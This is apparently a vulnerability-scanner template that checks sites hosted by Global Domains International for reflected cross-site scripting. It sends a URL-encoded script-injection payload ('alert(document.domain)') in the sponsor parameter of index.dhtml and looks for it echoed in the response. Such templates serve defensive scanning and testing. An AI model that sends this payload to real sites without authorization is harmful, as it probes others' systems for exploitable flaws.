id: global-domains-xss
brief:
    title: Global Domains International - Cross-Site Scripting
    by: princechaddha
    level: high
    about: Sites hosted by Global Domains International, Inc. have cross-site scripting and directory traversal vulnerabilities.
    label:
        - globaldomains
        - xss
        - packetstorm
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
      signs:
        - "on": word
          has:
            - </script><script>alert(document.domain)</script>
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
